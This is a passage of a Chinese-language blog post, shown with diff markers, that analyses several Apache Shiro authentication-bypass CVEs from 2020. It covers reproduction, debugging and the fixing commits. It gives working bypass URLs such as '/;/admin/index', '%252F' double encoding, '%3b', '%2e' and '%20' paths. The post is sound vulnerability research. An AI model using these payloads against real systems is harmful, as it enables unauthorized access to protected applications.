+<h4 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>对于采用 “&#x2F;“的形式绕过，在<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/589f10d40414a815dbcaf1f1500a51f41258ef70">Commit-589f10d</a> 和<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/9762f97926ba99ac0d958e088cae3be8b657948d">Commit-9762f97</a>中得到了修复，如果requestURI以 “&#x2F;“结尾就去除 </p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281718892.png" alt="image-20220928171802652"></p>
+<p>第二次提交是<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/9762f97926ba99ac0d958e088cae3be8b657948d">Commit-9762f97</a>，对path与 “&#x2F;“ 做了个判断</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281722499.png" alt="image-20220928172255334"></p>
+<p>对使用 <code>&quot;;&quot;</code> 绕过的修复在 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce">Commit-3708d79</a></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281725846.png" alt="image-20220928172526683"></p>
+<p>获取requestURI的方式发生了改变，改成如下方式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uri = request.getContextPath() + <span class="string">&quot;/&quot;</span> + request.getServletPath() + request.getPathInfo();</span><br></pre></td></tr></table></figure>
+
+<p>说明下这几个方法的区别：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">假设访问url为：http://127.0.0.1:8080/myshiro/admin/index</span><br><span class="line">request.getContextPath()：返回上下文路径（也就是工程名）</span><br><span class="line">    - 返回的就是/myshiro，如果工程名为空，那返回的也是空</span><br><span class="line">request.getServletPath()：返回除去host和工程名部分的路径</span><br><span class="line">    - 当访问servlet时：返回就是/admin/index</span><br><span class="line">    - 当访问resource目录下的login.jsp时：返回的就是/resource/login.jsp</span><br><span class="line">request.getRequestURI()：返回除去host（域名或者ip）部分的路径</span><br><span class="line">    - 当访问servlet时：/myshiro/admin/index</span><br><span class="line">    - 当访问resource目录下的login.jsp时：返回的就是/resource/login.jsp</span><br><span class="line">request.getRequestURL()：返回的整个URL的路径请求</span><br><span class="line">    - 返回的就是http://127.0.0.1:8080/myshiro/admin/index</span><br><span class="line">request.getRealPath()：返回的文件所在的绝对路径，相对于当前计算机的真实路径</span><br><span class="line">request.getPathInfo()：返回请求的实际URL相对于请求的serlvet的url的路径。</span><br><span class="line">	- 当servlet配置为(url-pattern=/admin/index/*)时，访问http://127.0.0.1:8080/myshiro/admin/index/a/b.html，则返回的就是/a/b.html</span><br><span class="line">request.getScheme()：返回的是使用的协议(http 或https)</span><br><span class="line">request.getProtocol()：获取的是协议的名称(HTTP/1.11)</span><br><span class="line">request.getServerName()：获取的是域名</span><br><span class="line">request.getLocalName()：获取到的是IP</span><br><span class="line"></span><br><span class="line">假设访问url为：http://localhost/hehehe  （无工程名）</span><br><span class="line">getContextPath:</span><br><span class="line">getServletPath：/hehehe</span><br><span class="line">getRequestURI():/hehehe</span><br><span class="line">getRequestURL()：http://localhost/hehehe</span><br><span class="line">getRealPath()：E:\java\myshiro\out\artifacts\myshiro_Web_exploded\</span><br><span class="line">getPathInfo()：null</span><br></pre></td></tr></table></figure>
+
+<p>但其实在这里测试使用 <code>&quot;;&quot;</code> 还是可以绕过，因为在<code>request.getContextPath</code>方法处理的结果还是包含 <code>&quot;;&quot;</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282149475.png" alt="image-20220928214909319"></p>
+<p>真正的修复在 shiro1.5.3中，直接采用<code>getServletPath(request) + getPathInfo(request)</code>获取requestURI，然后返回和PathPattern比对。</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290010452.png" alt="image-20220929001014321"></p>
+<p>再次用<code>/;/admin/index</code>测试得到如下：</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290005346.png" alt="image-20220929000516277"></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282158361.png" alt="image-20220928215845274"></p>
+<h3 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h3><h4 id="漏洞信息-6"><a href="#漏洞信息-6" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11989">CVE-2020-11989</a> &#x2F; <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-782">SHIRO-782</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.5.3</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">将 Apache Shiro 与 Spring 动态控制器一起使用时，特制请求可能会导致身份验证绕过。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">Spring | 双重编码 | %25%32%66 | 绕过 | context-path | &#x2F;;&#x2F;</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/01887f645f92d276bbaf7dc644ad28ed4e82ef02">Commit-01887f6</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a> <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA">https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA</a></td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>之前我们在配置路径表达式的时候都是配置成<code>/admin/**</code>这种形式，这种风格叫Ant风格，ANT 通配符有 3 种</p>
+<table>
+<thead>
+<tr>
+<th align="center">通配符</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">?</td>
+<td align="center">匹配任何单字符</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td align="center">匹配0或者任意数量的字符</td>
+</tr>
+<tr>
+<td align="center">**</td>
+<td align="center">匹配0或者更多的目录</td>
+</tr>
+</tbody></table>
+<p>当配置成 <code>/admin/*</code>时，我们访问 &#x2F;admin&#x2F;a会被拦截，但是访问 &#x2F;admin&#x2F;a&#x2F;b则不会，本次漏洞的触发原因之一就是当配置路径表达式中使用了 <code>&quot;*&quot;</code>， 下面我们搭建环境复现。</p>
+<p>环境有点小变化，ShiroConfig配置成如下形式 <code>/admin/*</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281816940.png" alt="image-20220928181605844"></p>
+<p>修改controller的路径访问，配置成restful风格的请求方式：<code>@PostMapping(value = &quot;/&#123;name&#125;&quot;)</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281821233.png" alt="image-20220928182139175"></p>
+<p>当访问<code>/admin/*</code>下的资源时，被拦截</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281823577.png" alt="image-20220928182341408"></p>
+<p>当访问<code>/admin/index%252Fxxxxxx</code>是时，权限被绕过</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281824386.png" alt="image-20220928182424218"></p>
+<h4 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在分析漏洞前，先了解下tomcat URL解析的差异，在CVE-2020-1957的结尾我们了解了<code>HTTPServletRequest</code>的几个解析URL的函数，现在回顾一遍</p>
+<blockquote>
+<p>网上的一个小结，Servlet的匹配路径为<code>/test%3F/*</code>，并且Web应用是部署在<code>/app</code>下，此时请求的URL为<code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a</code>，各个函数解析如下表：</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>URL解码</th>
+<th>解析结构</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>getRequestURL()</td>
+<td>no</td>
+<td><code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td>
+</tr>
+<tr>
+<td>getRequestURI()</td>
+<td>no</td>
+<td><code>/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td>
+</tr>
+<tr>
+<td>getContextPath()</td>
+<td>no</td>
+<td><code>/app</code></td>
+</tr>
+<tr>
+<td>getServletPath()</td>
+<td>yes</td>
+<td><code>/test?</code></td>
+</tr>
+<tr>
+<td>getPathInfo()</td>
+<td>yes</td>
+<td><code>/a?+b</code></td>
+</tr>
+</tbody></table>
+<p>结论的具体分析细节可以看这篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7544%EF%BC%9B%E8%B4%B4%E5%87%BA%E4%B8%8A%E9%9D%A2%E7%BB%93%E8%AE%BA%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%B0%B1%E6%98%AF%E8%BF%99%E6%AC%A1%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0%E4%B9%8B%E4%B8%80%E5%B0%B1%E6%9D%A5%E8%87%AA%E4%BA%8E%E4%B8%8A%E9%9D%A2%E5%88%97%E5%87%BA%E7%9A%84%E8%A7%A3%E6%9E%90%E5%87%BD%E6%95%B0%E5%AF%B9URL%E8%A7%A3%E7%A0%81%E7%9A%84%E7%89%B9%E6%80%A7%EF%BC%8C%E6%97%A2%E7%84%B6tomcat%E5%AF%B9url%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84%EF%BC%8C%E9%82%A3shiro%E7%9A%84%E5%A4%84%E7%90%86%E4%BC%9A%E6%9C%89%E6%89%80%E5%B7%AE%E5%BC%82%E4%B9%88%EF%BC%9F%E6%88%91%E4%BB%AC%E6%9D%A5%E5%88%86%E6%9E%90%E7%9C%8B%E7%9C%8B%E3%80%82">https://xz.aliyun.com/t/7544；贴出上面结论的原因就是这次的漏洞的成因之一就来自于上面列出的解析函数对URL解码的特性，既然tomcat对url的处理方式是这样的，那shiro的处理会有所差异么？我们来分析看看。</a></p>
+<p>本次漏洞环境还是用的shiro1.5.2的，请求<code>/myshiro/admin/index%252Faa</code>，调式 进入<code>getRequestUri</code>方法</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282247859.png" alt="image-20220928224714728"></p>
+<p>更进，发现调用了<code>request.getServletPath</code>方法进行uri拼接，在上面的函数表格里，<code>getServletPath</code>方法会对url进行一次解码</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282248896.png" alt="image-20220928224824750"></p>
+<p>可以看到此时<code>getServletPath</code>返回的值为 <code>/admin/index%2Faa</code>，uri为<code>/myshiro//admin/index%2Faa</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282253956.png" alt="image-20220928225355829"></p>
+<p>然后将uri传入<code>decodeAndCleanUriString</code>方法，继续进入<code>decodeRequestString</code>方法</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282255904.png" alt="image-20220928225500816"></p>
+<p>这里会对uri再进行一次解码，原本uri为<code>/myshiro//admin/index%2Faa</code>，解码之后得到<code>/myshiro//admin/index/aa</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282255289.png" alt="image-20220928225554119"></p>
+<p>然后返回<code>/admin/index/aa</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282311542.png" alt="image-20220928231154403"></p>
+<p>最后匹配不上，导致权限绕过</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282318852.png" alt="image-20220928231825694"></p>
+<p>而spring在处理时会把<code>/myshiro/admin/index%252Faa</code>处理成 <code>/admin/index%2Faa</code>，就会被<code>@PostMapping(value = &quot;/&#123;name&#125;&quot;)</code>接收，可能会绕过请求。</p>
+<h4 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>Shiro 在 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/01887f645f92d276bbaf7dc644ad28ed4e82ef02">Commit-01887f6</a> 中针对此漏洞进行了修复，第一处修改，采用<code>getServletPath(request) + getPathInfo(request)</code>获取requestURI</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282357669.png" alt="image-20220928235703523"></p>
+<p>第二处修改就是直接用<code>HttpServletRequest.getRequestURI</code>方法获取uri</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209282359112.png" alt="image-20220928235916963"></p>
+<h3 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h3><h4 id="漏洞信息-7"><a href="#漏洞信息-7" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13933">CVE-2020-13933</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-46579">CNVD-2020-46579</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.6.0</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">Spring | 顺序 | %3b | 绕过</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d">Commit-dc194fc</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8223">https://xz.aliyun.com/t/8223</a></td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>本次环境采用的是shiro1.5.3，使用CVE-2020-11989的payload发现失效</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290033884.png" alt="image-20220929003343765"></p>
+<p>使用 <code>/myshiro/admin/%3baa</code>成功绕过</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290030430.png" alt="image-20220929003023305"></p>
+<h4 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>发送payload，调式进入<code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication</code>方法中，根据表达式运算工具，返回的是 <code>&quot;/admin/&quot;</code>，和预期的一样</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290036230.png" alt="image-20220929003634143"></p>
+<p>下面简单分析下绕过的过程，在上面有提到过<code>WebUtils#getServletPath</code>会对url进行一次解码，因此我们请求的<code>/myshiro/admin/%3baa</code>变成了<code>/admin/;aa</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290038213.png" alt="image-20220929003830087"></p>
+<p>然后调用<code>removeSemicolon</code>方法处理，熟悉的都知道这个是去除 <code>&quot;;&quot;</code>及后面的字符串</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290040208.png" alt="image-20220929004034127"></p>
+<p>然后再调用<code>normalize</code>函数进行路径标准化处理，最后得到的就是<code>/admin/</code>，返回requestURI后，去除末尾的 <code>&quot;/&quot;</code>，与<code>pathPattern: &quot;/admin/*&quot;</code> 匹配失败导致权限绕过。</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290042047.png" alt="image-20220929004233861"></p>
+<p>而spring、tomcat会将请求处理成<code>/admin/;aa</code>，然后配合 <code>PathVariable</code> 注解 String 类型的参数，导致可以绕过鉴权请求 <code>/admin/&#123;name&#125;</code></p>
+<h4 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>本次漏洞修复位于 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d">Commit-dc194fc</a> 中，新增了一个全局过滤器</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290049896.png" alt="image-20220929004959661"></p>
+<p>在类的注释中详细的说明了该过滤器的作用和规则，将会阻断带有分号，反斜线，非 ASCII 字符的请求，返回400状态码</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290051726.png" alt="image-20220929005122565"></p>
+<p>并添加进全局过滤器中</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290058906.png" alt="image-20220929005854832"></p>
+<h3 id="CVE-2020-17510"><a href="#CVE-2020-17510" class="headerlink" title="CVE-2020-17510"></a>CVE-2020-17510</h3><h4 id="漏洞信息-8"><a href="#漏洞信息-8" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17510">CVE-2020-17510</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-60318">CNVD-2020-60318</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.7.0</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">Spring | 编码 | %2e | 绕过 | &#x2F;%2e%2e&#x2F;</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403">Commit-6acaaee</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/12bn9ysx6ogm830stywro4pkoq8dxzfk">https://lists.apache.org/thread/12bn9ysx6ogm830stywro4pkoq8dxzfk</a></td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>本次环境采用的是shiro1.6.0以及 <code>PathVariable</code> 注解 String 类型参数的场景，还是基于 AntPathMatcher 的绕过，前面的绕过有个共性就是shiro对uri处理的逻辑与Spring不同导致的，还记得CVE-2010-3836采用的是 <code>&quot;.&quot;</code> 进行绕过的，还有采用 <code>&quot;;&quot;</code>和URL编码%3b的，那 “.”的url编码%2e可否呢，本次漏洞的payload就是出自%2e。</p>
+<p>用CVE-2020-13933的payload，失败</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290111362.png" alt="image-20220929011116229"></p>
+<p>访问 <code>/myshiro/admin/%2e</code>即可绕过</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290109716.png" alt="image-20220929010952572"></p>
+<p>当然还有<code>/myshiro/admin/%2e/</code>，<code>/myshiro/admin/%2e%2e</code>，<code>/myshiro/admin/%2e%2e/</code> </p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290112656.png" alt="image-20220929011211496"></p>
+<h4 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>访问<code>/myshiro/admin/%2e</code>，调试进入<code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication</code>，运算表达式，可见返回<code>&quot;/admin/&quot;</code>，到这就不用继续下去了，和CVE-2020-13933的分析一样，先调用<code>getServletPath</code>方法对 <code>/admin/%2e</code>进行url解码得到<code>/admin/.</code>，然后经过<code>normalize</code>函数路径标准化将<code>/admin/.</code>转化为<code>/admin/</code>，到这也就为什么<code>/myshiro/admin/%2e/</code>，<code>/myshiro/admin/%2e%2e</code>，<code>/myshiro/admin/%2e%2e/</code> 这几个payload能用的原因了，经过这两个方法处理都“无了”。</p>
+<blockquote>
+<p>经测试，<code>getServletPath</code>方法会进行url解码，”;”及后面字符串的去除，和路径标准化处理</p>
+</blockquote>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290116378.png" alt="image-20220929011646282"></p>
+<p>对于Spring来说，Spring Boot 版本在小于等于 2.3.0.RELEASE时，会对uri进行解码然后路径标准化，这样得到的路径为<code>/myshiro/admin</code>，没有路径与之匹配。所以只有当 Spring Boot 版本在大于 2.3.0.RELEASE时标准化路径后<code>/myshiro/admin/%2e</code>，然后解码得到<code>/myshiro/admin/.</code>，所以其他payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/myshiro/admin/%2e/  -&gt; /myshiro/admin/%2e/ -&gt; /myshiro/admin/./ </span><br><span class="line">/myshiro/admin/%2e%2e  -&gt; /myshiro/admin/%2e%2e -&gt; /myshiro/admin/..</span><br><span class="line">/myshiro/admin/%2e%2e/  -&gt; /myshiro/admin/%2e%2e/ -&gt; /myshiro/admin/../</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>本次漏洞修复位于 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403">Commit-6acaaee</a>，创建了 UrlPathHelper 的子类 ShiroUrlPathHelper，并重写了 <code>getPathWithinApplication</code> 和 <code>getPathWithinServletMapping</code> 两个方法，使得spring在处理uri时使用 Shiro 自己的逻辑 <code>WebUtils#getPathWithinApplication</code> 进行返回，这样就能保证Spring 与 Shiro 处理requestURI时不会在差异</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290234831.png" alt="image-20220929023441599"></p>
+<p>创建好ShiroUrlPathHelper类后，就将其导入到ApplicationConfig配置类中</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290239331.png" alt="image-20220929023951127"></p>
+<p>将<code>RequestMappingHandlerMapping#urlPathHelper</code> 设置为 <code>ShiroUrlPathHelper</code>，而后，Spring 在匹配 handler 时获取路径的逻辑就会使用 Shiro 提供的逻辑。在高版本的spring中，会导致应用程序使用 <code>UrlPathHelper.defaultInstance</code> 来处理，而不是 Shiro 实现的 <code>ShiroUrlPathHelper</code> 来处理，又会导致权限绕过的产生。</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290244102.png" alt="image-20220929024451029"></p>
+<h3 id="CVE-2020-17523"><a href="#CVE-2020-17523" class="headerlink" title="CVE-2020-17523"></a>CVE-2020-17523</h3><h4 id="漏洞信息-9"><a href="#漏洞信息-9" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17523">CVE-2020-17523</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-09492">CNVD-2021-09492</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.7.1</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">Spring | trim | %20 | 绕过 | &#x2F;%20%20&#x2F;</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/ab1ea4a2006f6bd6a2b5f72740b7135662f8f160">Commit-ab1ea4a</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/230935">https://www.anquanke.com/post/id/230935</a> <a target="_blank" rel="noopener" href="https://www.eso.org/~ndelmott/url_encode.html">https://www.eso.org/~ndelmott/url_encode.html</a></td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>本次环境用的是shiro1.7.0和依赖单个 “*” 的通配符以及 <code>PathVariable</code> 注解 String 类型的参数的场景触发漏洞，本次的绕过方法是使用空格的 URL 编码：<code>%20</code>。</p>
+<p>访问 <code>/myshiro/admin/%20</code>成功绕过，当然也可以 <code>/myshiro/admin/%20%20</code> <code>/myshiro/admin/%20%20/</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290321040.png" alt="image-20220929032153886"></p>
+<h4 id="漏洞分析-9"><a href="#漏洞分析-9" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>处理完之后的requestURI为 <code>&quot;/admin/ &quot;</code>和pathPattern <code>&quot;/admin/*&quot;</code>进行匹配，这里肯定是匹配失败返回false的，但是为什么呢</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290305963.png" alt="image-20220929030502864"></p>
+<p>跟进来到<code>org.apache.shiro.util.AntPathMatcher#doMatch</code>方法，这里会调用<code>org.apache.shiro.util.StringUtils#tokenizeToStringArray</code>方法对pattern和path进行处理，我们跟进去</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290307188.png" alt="image-20220929030711053"></p>
+<p>在<code>org.apache.shiro.util.StringUtils#tokenizeToStringArray</code>方法中主要是将str按照delimiters进行分割，然后保存到tokens中，其中传入的两个布尔类型的参数trimTokens控制是否对token去除空格，ignoreEmptyTokens控制是否忽略空的tokens</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290311637.png" alt="image-20220929031134396"></p>
+<p>在去出第二个token时，这里的token为 <code>&quot; &quot;</code>，因为经过<code>trim()</code>处理后为<code>&quot;&quot;</code>，所以最终返回的tokens数组就只有admin一个，导致匹配失败</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290314800.png" alt="image-20220929031416572"></p>
+<p>而对于spring来说，空格也是可以作为RequestMapping请求的路径的，所以能够请求成功</p>
+<h4 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>本次漏洞修复位于<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/ab1ea4a2006f6bd6a2b5f72740b7135662f8f160">Commit-ab1ea4a</a>，将<code>org.apache.shiro.util.StringUtils#tokenizeToStringArray</code> 方法的第三个参数 trimTokens 设置为 false，忽略空格的去除</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209290318338.png" alt="image-20220929031859220"></p>
+<h3 id="CVE-2021-41303"><a href="#CVE-2021-41303" class="headerlink" title="CVE-2021-41303"></a>CVE-2021-41303</h3><h4 id="漏洞信息-10"><a href="#漏洞信息-10" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41303">CVE-2021-41303</a> &#x2F; <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-825">SHIRO-825</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.8.0</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
